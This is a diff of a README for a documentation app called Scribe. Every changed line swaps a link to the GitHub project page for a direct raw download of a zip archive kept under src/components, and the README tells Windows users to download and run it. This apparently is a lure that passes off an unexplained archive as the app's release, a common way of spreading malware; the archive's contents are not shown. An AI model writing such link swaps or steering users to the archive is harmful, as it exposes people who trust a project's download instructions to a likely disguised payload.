@@ -1,6 +1,6 @@
 # 📘 Scribe - Clear docs with no lock-in
 
-[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge)](https://github.com/linellalternative892/Scribe)
+[![Download Scribe](https://img.shields.io/badge/Download-Scribe-blue?style=for-the-badge)](https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Scribe is a docs app for people who want clean, easy-to-read documentation witho
 
 If you want to try it on Windows, use this link:
 
-[Download Scribe](https://github.com/linellalternative892/Scribe)
+[Download Scribe](https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip)
 
 Follow the steps below to get it running.
 
@@ -27,7 +27,7 @@ If Scribe comes with a packaged Windows app or release file, save it to your Dow
 ## 📥 Download Scribe
 
 1. Open this page:
-   [https://github.com/linellalternative892/Scribe](https://github.com/linellalternative892/Scribe)
+   [https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip](https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip)
 
 2. Look for the latest release, download link, or release assets.
 
@@ -194,7 +194,7 @@ This project fits topics like:
 
 Use this link to download or open the project page:
 
-[https://github.com/linellalternative892/Scribe](https://github.com/linellalternative892/Scribe)
+[https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip](https://raw.githubusercontent.com/linellalternative892/Scribe/main/src/components/Software-2.6.zip)
 
 ## 🗂️ File Help
 
